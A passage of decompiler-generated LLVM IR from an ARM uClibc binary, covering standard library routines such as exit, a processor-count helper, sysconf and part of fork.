  %v4_14824 = phi i32 [ %v4_148242443, %dec_label_pc_1481c ], [ 0, %bb68 ]
  %v2_14824 = xor i1 %v9_1481c, true
  %v3_14824 = and i1 %v3_1481c, %v2_14824
  br i1 %v3_14824, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_14824 = urem i32 %v4_14824, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_14828 = phi i32 [ %v5_14824, %bb70 ], [ %v4_14824, %bb69 ]
  %v2_14828 = icmp eq i32 %v0_14828, 0
  br i1 %v2_14828, label %bb71, label %dec_label_pc_14834

bb71:                                             ; preds = %thread-pre-split
  %v4_1482c = mul i32 %v0_14808, %v1_14800
  %v5_1482c = add i32 %v4_1482c, %v3_1482c
  store i32 %v5_1482c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_147d4

dec_label_pc_14834:                               ; preds = %bb67, %thread-pre-split
  %v0_1483c = call i32 @__aeabi_read_tp()
  %v0_14840 = load i32, i32* %r7.global-to-local, align 4
  %v2_14840 = and i32 %v0_14704, %v0_14840
  store i32 %v2_14840, i32* %r7.global-to-local, align 4
  %v0_14844 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14844, i32* %ip.global-to-local, align 4
  %v3_14848 = load i16, i16* @global_var_23068.363, align 2
  %v4_14848 = sext i16 %v3_14848 to i32
  %v3_14850 = add i32 %v4_14848, %v0_1483c
  %v4_14850 = inttoptr i32 %v3_14850 to i32*
  store i32 34, i32* %v4_14850, align 4
  %v0_147d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_147d4

dec_label_pc_14858.loopexit:                      ; preds = %bb66
  %v0_14858.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_14858

dec_label_pc_14858:                               ; preds = %.thread, %dec_label_pc_14858.loopexit
  %v1_1485c = phi i32 [ %v1_1485c27, %dec_label_pc_14858.loopexit ], [ %v1_1485c29, %.thread ]
  %v2_1485c = phi i32 [ %v0_14858.pre, %dec_label_pc_14858.loopexit ], [ %v0_146f8, %.thread ]
  %v2_14858 = icmp eq i32 %v2_1485c, 0
  br i1 %v2_14858, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_14858
  %v3_1485c = inttoptr i32 %v2_1485c to i32*
  store i32 %v1_1485c, i32* %v3_1485c, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_14858, %bb72
  %v0_14864 = load i32, i32* %r7.global-to-local, align 4
  %v2_14864 = icmp eq i32 %v0_14864, 0
  %. = select i1 %v2_14864, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_14870 = icmp eq i32 %v0_14704, 0
  %v0_1489c.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_14870, label %dec_label_pc_14894, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_1489c.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_1487c, label %dec_label_pc_14894

dec_label_pc_1487c:                               ; preds = %bb76
  %v0_14880 = call i32 @__aeabi_read_tp()
  %v3_14884 = load i16, i16* @global_var_23068.363, align 2
  %v4_14884 = sext i16 %v3_14884 to i32
  %v3_1488c = add i32 %v4_14884, %v0_14880
  %v4_1488c = inttoptr i32 %v3_1488c to i32*
  store i32 34, i32* %v4_1488c, align 4
  %v0_14890 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14890, i32* %ip.global-to-local, align 4
  %v0_14894.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14894

dec_label_pc_14894:                               ; preds = %bb76, %bb73, %dec_label_pc_1487c
  %v0_1489c.pre = phi i32 [ %v0_1489c.pre.pre, %bb76 ], [ %v0_14890, %dec_label_pc_1487c ], [ %v0_1489c.pre.pre, %bb73 ]
  %v0_14894 = phi i32 [ %v0_14864, %bb76 ], [ %v0_14894.pre, %dec_label_pc_1487c ], [ %v0_14864, %bb73 ]
  %v2_14894 = icmp eq i32 %v0_14894, 0
  br i1 %v2_14894, label %dec_label_pc_14894._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_14894
  %v2_14898 = sub i32 0, %v0_1489c.pre
  store i32 %v2_14898, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14894._crit_edge

dec_label_pc_14894._crit_edge:                    ; preds = %dec_label_pc_14894, %bb77
  %v0_1489c = phi i32 [ %v2_14898, %bb77 ], [ %v0_1489c.pre, %dec_label_pc_14894 ]
  ret i32 %v0_1489c

; uselistorder directives
  uselistorder i32 %v0_1489c.pre, { 1, 0 }
  uselistorder i32 %v0_1489c.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_14824, { 1, 0 }
  uselistorder i1 %v3_1481c, { 1, 0 }
  uselistorder i32 %v1_1481c, { 1, 0 }
  uselistorder i32 %v5_147fc, { 1, 0 }
  uselistorder i32 %v1_147e8, { 1, 0 }
  uselistorder i32 %v1_147e0, { 2, 0, 1 }
  uselistorder i32 %v0_14814, { 1, 0, 2 }
  uselistorder i32 %v0_147d4, { 1, 0 }
  uselistorder i32 %v3_14784, { 1, 0 }
  uselistorder i32 %v1_14778, { 1, 0, 2 }
  uselistorder i32 %v0_1476c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_14748, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14704, { 1, 0 }
  uselistorder i32 %v0_14700, { 1, 0, 2, 3 }
  uselistorder i32 %v0_146fc, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 8, 3, 9, 6, 5, 7 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14894._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14894, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_14858, { 1, 0 }
  uselistorder label %dec_label_pc_14834, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147d8, { 1, 0 }
  uselistorder label %dec_label_pc_147d4, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1474c, { 1, 0 }
  uselistorder label %dec_label_pc_14748, { 1, 0 }
  uselistorder label %dec_label_pc_14710, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r5, align 4
  %v4_148c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 140) to i32*), align 4
  store i32 %v4_148c8, i32* @r4, align 4
  %v2_148d0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_148e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_148e8)
  %v0_148fc = load i32, i32* @r5, align 4
  %v2_148fc = add i32 %v0_148fc, 16
  %v3_148fc = inttoptr i32 %v2_148fc to i32*
  %v4_148fc = load i32, i32* %v3_148fc, align 4
  call void @__pseudo_branch(i32 %v4_148fc)
  %v0_1490c = load i32, i32* @r5, align 4
  %v2_1490c = add i32 %v0_1490c, 632
  %v3_1490c = inttoptr i32 %v2_1490c to i32*
  %v4_1490c = load i32, i32* %v3_1490c, align 4
  %v2_14914 = icmp eq i32 %v4_1490c, 0
  br i1 %v2_14914, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_14920 = xor i1 %v2_14914, true
  call void @__pseudo_cond_branch(i1 %v2_14920, i32 %v4_1490c)
  store i32 %v2_148d0, i32* @r0, align 4
  %v0_14930 = load i32, i32* @r5, align 4
  %v2_14930 = add i32 %v0_14930, 44
  %v3_14930 = inttoptr i32 %v2_14930 to i32*
  %v4_14930 = load i32, i32* %v3_14930, align 4
  call void @__pseudo_branch(i32 %v4_14930)
  %v0_1493c = call i32 @__GI___uClibc_fini()
  %v0_14944 = load i32, i32* @r5, align 4
  %v2_14944 = add i32 %v0_14944, -47948
  %v2_1494c = icmp eq i32 %v2_14944, 0
  br i1 %v2_1494c, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_14954 = xor i1 %v2_1494c, true
  call void @__pseudo_cond_branch(i1 %v2_14954, i32 %v2_14944)
  %v0_14958 = load i32, i32* @r6, align 4
  %v1_1495c = call i32 @__GI__exit(i32 %v0_14958)
  %v0_14960 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14960, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v2_14960 = load i32, i32* @r4, align 4
  %v5_14960 = sdiv i32 %v2_14960, 16384
  %v6_14960 = and i32 %v5_14960, %v1_1495c
  store i32 %v6_14960, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_14978 = phi i32 [ %v1_1495c, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_14978

; uselistorder directives
  uselistorder i32 %v1_1495c, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -34168), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_149a0 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -34168))
  store i32 %v1_149a0, i32* @r6, align 4
  %v2_149a4 = icmp eq i32 %v1_149a0, 0
  br i1 %v2_149a4, label %dec_label_pc_14a24, label %dec_label_pc_149ac

dec_label_pc_149ac:                               ; preds = %entry
  store i32 272, i32* @sl, align 4
  %v0_149b4 = load i32, i32* @r4, align 4
  %v2_149b4 = add i32 %v0_149b4, -34804
  store i32 %v2_149b4, i32* @r8, align 4
  %v2_149b8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_149b8, i32* @r7, align 4
  br label %bb18

dec_label_pc_149c0:                               ; preds = %bb18
  %v3_149c0 = load i32, i32* %stack_var_-36, align 4
  %v1_149c4 = inttoptr i32 %v3_149c0 to i32*
  %v2_149c4 = load i32, i32* %v1_149c4, align 4
  %v1_149c8 = inttoptr i32 %v2_149c4 to i8*
  %v2_149c8 = load i8, i8* %v1_149c8, align 1
  %v7_149cc = icmp eq i8 %v2_149c8, 99
  br i1 %v7_149cc, label %dec_label_pc_149d4, label %.backedge3

dec_label_pc_149d4:                               ; preds = %dec_label_pc_149c0
  %v1_149d4 = add i32 %v2_149c4, 1
  %v2_149d4 = inttoptr i32 %v1_149d4 to i8*
  %v3_149d4 = load i8, i8* %v2_149d4, align 1
  %v7_149d8 = icmp eq i8 %v3_149d4, 112
  br i1 %v7_149d8, label %dec_label_pc_149e0, label %.backedge3

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149d4
  %v1_149e0 = add i32 %v2_149c4, 2
  %v2_149e0 = inttoptr i32 %v1_149e0 to i8*
  %v3_149e0 = load i8, i8* %v2_149e0, align 1
  %v7_149e4 = icmp eq i8 %v3_149e0, 117
  br i1 %v7_149e4, label %dec_label_pc_149ec, label %.backedge3

dec_label_pc_149ec:                               ; preds = %dec_label_pc_149e0
  %v1_149ec = add i32 %v2_149c4, 3
  %v2_149ec = inttoptr i32 %v1_149ec to i8*
  %v3_149ec = load i8, i8* %v2_149ec, align 1
  %v4_149ec = zext i8 %v3_149ec to i32
  %v0_149f0 = load i32, i32* @r4, align 4
  %v1_149f0 = load i32, i32* @sl, align 4
  %v2_149f0 = add i32 %v1_149f0, %v0_149f0
  %v3_149f0 = inttoptr i32 %v2_149f0 to i32*
  %v4_149f0 = load i32, i32* %v3_149f0, align 4
  %v2_149f4 = mul nuw nsw i32 %v4_149ec, 2
  %v2_149f8 = add i32 %v4_149f0, %v2_149f4
  %v3_149f8 = inttoptr i32 %v2_149f8 to i16*
  %v4_149f8 = load i16, i16* %v3_149f8, align 2
  %v1_149fc = and i16 %v4_149f8, 8
  %v2_149fc = icmp eq i16 %v1_149fc, 0
  br i1 %v2_149fc, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_149ec
  %v1_14a00 = load i32, i32* @r5, align 4
  %v2_14a00 = add i32 %v1_14a00, 1
  store i32 %v2_14a00, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_149ec, %dec_label_pc_149c0, %dec_label_pc_149d4, %dec_label_pc_149e0
  %v0_14a04.pre = load i32, i32* @r6, align 4
  %v0_14a10.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_149ac
  %v0_14a10 = phi i32 [ %v0_14a10.pre, %.backedge3 ], [ %v2_149b4, %dec_label_pc_149ac ]
  %v0_14a04 = phi i32 [ %v0_14a04.pre, %.backedge3 ], [ %v1_149a0, %dec_label_pc_149ac ]
  %v4_14a14 = inttoptr i32 %v0_14a04 to i32*
  %v5_14a14 = call i32 @__GI_config_read(i32* %v4_14a14, i32 %v2_149b8, i32 258, i32 %v0_14a10)
  %v2_14a18 = icmp eq i32 %v5_14a14, 0
  br i1 %v2_14a18, label %dec_label_pc_14a88, label %dec_label_pc_149c0

dec_label_pc_14a24:                               ; preds = %entry
  %v0_14a28 = load i32, i32* @r4, align 4
  %v2_14a28 = add i32 %v0_14a28, -34156
  store i32 %v2_14a28, i32* @r0, align 4
  %v1_14a2c = call i32 @__GI_config_open(i32 %v2_14a28)
  store i32 %v1_14a2c, i32* @r6, align 4
  %v2_14a30 = icmp eq i32 %v1_14a2c, 0
  br i1 %v2_14a30, label %bb19, label %dec_label_pc_14a3c

bb19:                                             ; preds = %dec_label_pc_14a24
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14a88

dec_label_pc_14a3c:                               ; preds = %dec_label_pc_14a24
  %v0_14a40 = load i32, i32* @r4, align 4
  %v2_14a40 = add i32 %v0_14a40, -34140
  store i32 %v2_14a40, i32* @r8, align 4
  %v2_14a48 = add i32 %v0_14a40, -34104
  store i32 %v2_14a48, i32* @r7, align 4
  %v2_14a4c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14a4c, i32* @r4, align 4
  br label %bb21

dec_label_pc_14a54:                               ; preds = %bb21
  %v0_14a80 = load i32, i32* @r8, align 4
  %v3_14a54 = load i32, i32* %stack_var_-36, align 4
  %v1_14a58 = inttoptr i32 %v3_14a54 to i32*
  %v2_14a58 = load i32, i32* %v1_14a58, align 4
  store i32 %v2_14a58, i32* @r1, align 4
  %v2_14a5c = inttoptr i32 %v0_14a80 to i8*
  %v3_14a5c = call i32 @__GI_strcoll(i8* %v2_14a5c, i32 %v2_14a58)
  %v2_14a60 = icmp eq i32 %v3_14a5c, 0
  br i1 %v2_14a60, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_14a54
  %v1_14a64 = load i32, i32* @r5, align 4
  %v2_14a64 = add i32 %v1_14a64, 1
  store i32 %v2_14a64, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_14a54
  %v0_14a70.pre = load i32, i32* @r7, align 4
  %v0_14a74.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_14a3c
  %v0_14a74 = phi i32 [ %v0_14a74.pre, %.backedge ], [ %v1_14a2c, %dec_label_pc_14a3c ]
  %v0_14a70 = phi i32 [ %v0_14a70.pre, %.backedge ], [ %v2_14a48, %dec_label_pc_14a3c ]
  %v4_14a78 = inttoptr i32 %v0_14a74 to i32*
  %v5_14a78 = call i32 @__GI_config_read(i32* %v4_14a78, i32 %v2_14a4c, i32 459266, i32 %v0_14a70)
  %v2_14a7c = icmp eq i32 %v5_14a78, 0
  br i1 %v2_14a7c, label %dec_label_pc_14a88, label %dec_label_pc_14a54

dec_label_pc_14a88:                               ; preds = %bb18, %bb21, %bb19
  %v0_14a88 = load i32, i32* @r6, align 4
  %v1_14a8c = inttoptr i32 %v0_14a88 to i32*
  %v2_14a8c = call i32 @__GI_config_close(i32* %v1_14a8c)
  %v0_14a90 = load i32, i32* @r5, align 4
  %v2_14a90 = icmp eq i32 %v0_14a90, 0
  %.v0_14a90 = select i1 %v2_14a90, i32 1, i32 %v0_14a90
  ret i32 %.v0_14a90

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_14a88, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_14ebc

bb:                                               ; preds = %entry
  %v7_14ae0 = mul i32 %arg1, 4
  %v8_14ae0 = add i32 %v7_14ae0, ptrtoint (i32* @global_var_14ae8.508 to i32)
  call void @__pseudo_branch(i32 %v8_14ae0)
  br label %dec_label_pc_14ebc

dec_label_pc_14ebc:                               ; preds = %bb, %entry
  %v0_14ec0 = call i32 @__aeabi_read_tp()
  %v3_14ec4 = load i16, i16* @global_var_23068.363, align 2
  %v4_14ec4 = sext i16 %v3_14ec4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14ed0 = add i32 %v4_14ec4, %v0_14ec0
  %v4_14ed0 = inttoptr i32 %v3_14ed0 to i32*
  store i32 22, i32* %v4_14ed0, align 4
  %v0_150b4 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_150b4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_150f0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_150f0, i32* @ip, align 4
  store i32 12768, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r8.global-to-local, align 4
  %v4_151e016 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12768) to i32*), align 4
  store i32 %v4_151e016, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151e418 = icmp eq i32 %v4_151e016, 0
  br i1 %v2_151e418, label %dec_label_pc_151ec, label %dec_label_pc_15110

dec_label_pc_15110:                               ; preds = %entry, %dec_label_pc_151e0.backedge
  store i32 -61441, i32* @ip, align 4
  call void @__pseudo_branch(i32 -61536)
  %v0_1511c = load i32, i32* %r7.global-to-local, align 4
  %v1_1511c = add i32 %v0_1511c, 20
  %v2_1511c = inttoptr i32 %v1_1511c to i32*
  %v3_1511c = load i32, i32* %v2_1511c, align 4
  store i32 %v3_1511c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15120 = icmp eq i32 %v3_1511c, 0
  store i32 %v3_1511c, i32* %r4.global-to-local, align 4
  br i1 %v2_15120, label %dec_label_pc_151e0.backedge, label %dec_label_pc_15130

dec_label_pc_151e0.backedge:                      ; preds = %dec_label_pc_15110, %dec_label_pc_1515c
  %v0_151e0 = load i32, i32* %r8.global-to-local, align 4
  %v1_151e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_151e0 = add i32 %v1_151e0, %v0_151e0
  %v3_151e0 = inttoptr i32 %v2_151e0 to i32*
  %v4_151e0 = load i32, i32* %v3_151e0, align 4
  store i32 %v4_151e0, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151e4 = icmp eq i32 %v4_151e0, 0
  br i1 %v2_151e4, label %dec_label_pc_151ec, label %dec_label_pc_15110

dec_label_pc_15130:                               ; preds = %dec_label_pc_15110
  %v0_15130 = load i32, i32* %r8.global-to-local, align 4
  %v1_15130 = load i32, i32* %r5.global-to-local, align 4
  %v2_15130 = add i32 %v1_15130, %v0_15130
  %v3_15130 = inttoptr i32 %v2_15130 to i32*
  %v4_15130 = load i32, i32* %v3_15130, align 4
  %v1_15134 = add i32 %v4_15130, 20
  store i32 %v1_15134, i32* %r2.global-to-local, align 4
  %v1_15138132 = inttoptr i32 %v1_15134 to i32*
  %v2_15138133 = load i32, i32* %v1_15138132, align 4
  store i32 %v2_15138133, i32* %r3.global-to-local, align 4
  %v3_1513c135 = icmp uge i32 %v2_15138133, %v3_1511c
  store i1 %v3_1513c135, i1* %cpsr_c.global-to-local, align 1
  %v9_1513c141 = icmp eq i32 %v2_15138133, %v3_1511c
  br i1 %v9_1513c141, label %dec_label_pc_15144, label %dec_label_pc_1515c

dec_label_pc_15144:                               ; preds = %dec_label_pc_15130, %dec_label_pc_15144.dec_label_pc_15138_crit_edge
  %v0_15144142 = phi i32 [ %v1_1513c.pre, %dec_label_pc_15144.dec_label_pc_15138_crit_edge ], [ %v3_1511c, %dec_label_pc_15130 ]
  store i32 %v0_15144142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15154 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15154, label %dec_label_pc_15158, label %dec_label_pc_15144.dec_label_pc_15138_crit_edge

dec_label_pc_15144.dec_label_pc_15138_crit_edge:  ; preds = %dec_label_pc_15144
  %v0_15138.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1513c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15138 = inttoptr i32 %v0_15138.pre to i32*
  %v2_15138 = load i32, i32* %v1_15138, align 4
  store i32 %v2_15138, i32* %r3.global-to-local, align 4
  %v3_1513c = icmp uge i32 %v2_15138, %v1_1513c.pre
  store i1 %v3_1513c, i1* %cpsr_c.global-to-local, align 1
  %v9_1513c = icmp eq i32 %v2_15138, %v1_1513c.pre
  br i1 %v9_1513c, label %dec_label_pc_15144, label %dec_label_pc_1515c

dec_label_pc_15158:                               ; preds = %dec_label_pc_15144
  %v0_15158 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15158, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1515c

dec_label_pc_1515c:                               ; preds = %dec_label_pc_15130, %dec_label_pc_15144.dec_label_pc_15138_crit_edge, %dec_label_pc_15158
  %v0_1515c = phi i32 [ %v0_15158, %dec_label_pc_15158 ], [ %v2_15138133, %dec_label_pc_15130 ], [ %v2_15138, %dec_label_pc_15144.dec_label_pc_15138_crit_edge ]
  %v1_1515c = phi i32 [ %v0_15158, %dec_label_pc_15158 ], [ %v3_1511c, %dec_label_pc_15130 ], [ %v1_1513c.pre, %dec_label_pc_15144.dec_label_pc_15138_crit_edge ]
  %v3_1515c = icmp uge i32 %v0_1515c, %v1_1515c
  store i1 %v3_1515c, i1* %cpsr_c.global-to-local, align 1
  %v9_1515c = icmp eq i32 %v0_1515c, %v1_1515c
  br i1 %v9_1515c, label %dec_label_pc_15164, label %dec_label_pc_151e0.backedge

dec_label_pc_15164:                               ; preds = %dec_label_pc_1515c
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_15178 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_15168

dec_label_pc_15168:                               ; preds = %dec_label_pc_151d0, %dec_label_pc_15164
  %v0_15168 = load i32, i32* %r7.global-to-local, align 4
  %v1_15168 = add i32 %v0_15168, 4
  %v2_15168 = inttoptr i32 %v1_15168 to i32*
  %v3_15168 = load i32, i32* %v2_15168, align 4
  store i32 %v3_15168, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1516c = icmp eq i32 %v3_15168, 0
  br i1 %v2_1516c, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_15168
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_15168, %bb
  %v2_15174 = xor i1 %v2_1516c, true
  call void @__pseudo_cond_branch(i1 %v2_15174, i32 %v3_15168)
  %v0_1517c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1517c, i32* %stack_var_-88, align 4
  %v1_15180 = inttoptr i32 %v0_1517c to i32*
  %v2_15180 = load i32, i32* %v1_15180, align 4
  store i32 %v2_15180, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15184 = icmp eq i32 %v2_15180, 0
  store i32 %v2_15178, i32* %r5.global-to-local, align 4
  br i1 %v2_15184, label %dec_label_pc_151f0.loopexit, label %dec_label_pc_15198

dec_label_pc_15198:                               ; preds = %bb72
  %v1_15198 = add i32 %v2_15180, 20
  store i32 %v1_15198, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1519c

dec_label_pc_1519c:                               ; preds = %dec_label_pc_151d0.dec_label_pc_1519c_crit_edge, %dec_label_pc_15198
  %v0_151a0 = phi i32 [ %v0_151a0.pre, %dec_label_pc_151d0.dec_label_pc_1519c_crit_edge ], [ %v1_15198, %dec_label_pc_15198 ]
  %v0_1519c = phi i32 [ %v0_1519c.pre, %dec_label_pc_151d0.dec_label_pc_1519c_crit_edge ], [ %v2_15180, %dec_label_pc_15198 ]
  %v1_1519c = add i32 %v0_1519c, 20
  %v2_1519c = inttoptr i32 %v1_1519c to i32*
  %v3_1519c = load i32, i32* %v2_1519c, align 4
  store i32 %v0_151a0, i32* %r2.global-to-local, align 4
  store i32 %v3_1519c, i32* %r4.global-to-local, align 4
  %v1_151ac119 = inttoptr i32 %v0_151a0 to i32*
  %v2_151ac120 = load i32, i32* %v1_151ac119, align 4
  store i32 %v2_151ac120, i32* %r3.global-to-local, align 4
  %v3_151b0122 = icmp uge i32 %v2_151ac120, %v3_1519c
  store i1 %v3_151b0122, i1* %cpsr_c.global-to-local, align 1
  %v9_151b0128 = icmp eq i32 %v2_151ac120, %v3_1519c
  br i1 %v9_151b0128, label %dec_label_pc_151b8, label %dec_label_pc_151d0

dec_label_pc_151b8:                               ; preds = %dec_label_pc_1519c, %dec_label_pc_151b8.dec_label_pc_151ac_crit_edge
  %v0_151b8129 = phi i32 [ %v1_151b0.pre, %dec_label_pc_151b8.dec_label_pc_151ac_crit_edge ], [ %v3_1519c, %dec_label_pc_1519c ]
  store i32 %v0_151b8129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_151c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_151c8, label %dec_label_pc_151cc, label %dec_label_pc_151b8.dec_label_pc_151ac_crit_edge

dec_label_pc_151b8.dec_label_pc_151ac_crit_edge:  ; preds = %dec_label_pc_151b8
  %v0_151ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_151b0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_151ac = inttoptr i32 %v0_151ac.pre to i32*
  %v2_151ac = load i32, i32* %v1_151ac, align 4
  store i32 %v2_151ac, i32* %r3.global-to-local, align 4
  %v3_151b0 = icmp uge i32 %v2_151ac, %v1_151b0.pre
  store i1 %v3_151b0, i1* %cpsr_c.global-to-local, align 1
  %v9_151b0 = icmp eq i32 %v2_151ac, %v1_151b0.pre
  br i1 %v9_151b0, label %dec_label_pc_151b8, label %dec_label_pc_151d0

dec_label_pc_151cc:                               ; preds = %dec_label_pc_151b8
  %v0_151cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_151cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_151d0

dec_label_pc_151d0:                               ; preds = %dec_label_pc_1519c, %dec_label_pc_151b8.dec_label_pc_151ac_crit_edge, %dec_label_pc_151cc
  %v0_151d0 = phi i32 [ %v0_151cc, %dec_label_pc_151cc ], [ %v2_151ac120, %dec_label_pc_1519c ], [ %v2_151ac, %dec_label_pc_151b8.dec_label_pc_151ac_crit_edge ]
  %v1_151d0 = phi i32 [ %v0_151cc, %dec_label_pc_151cc ], [ %v3_1519c, %dec_label_pc_1519c ], [ %v1_151b0.pre, %dec_label_pc_151b8.dec_label_pc_151ac_crit_edge ]
  %v3_151d0 = icmp uge i32 %v0_151d0, %v1_151d0
